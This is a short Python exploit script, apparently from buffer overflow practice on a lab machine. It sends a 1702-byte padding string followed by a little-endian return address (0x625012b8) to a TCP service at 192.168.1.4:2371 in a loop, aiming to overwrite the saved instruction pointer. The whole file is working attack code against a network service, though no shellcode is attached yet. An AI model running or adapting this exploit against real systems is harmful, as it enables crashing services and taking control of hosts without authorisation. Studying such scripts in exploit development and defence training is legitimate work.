#!/usr/bin/python
import sys , socket


IP='192.168.1.4'
port=2371

# module_address = 0x625012b8 but we writting it in reverse because this x86 system follows little endian
# offset = 1702

buffer ='A' * 1702 + '\xb8\x12\x50\x62' 


while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((IP , port))
        
        s.send((buffer))
        s.close
        
    except:
        
        sys.exit()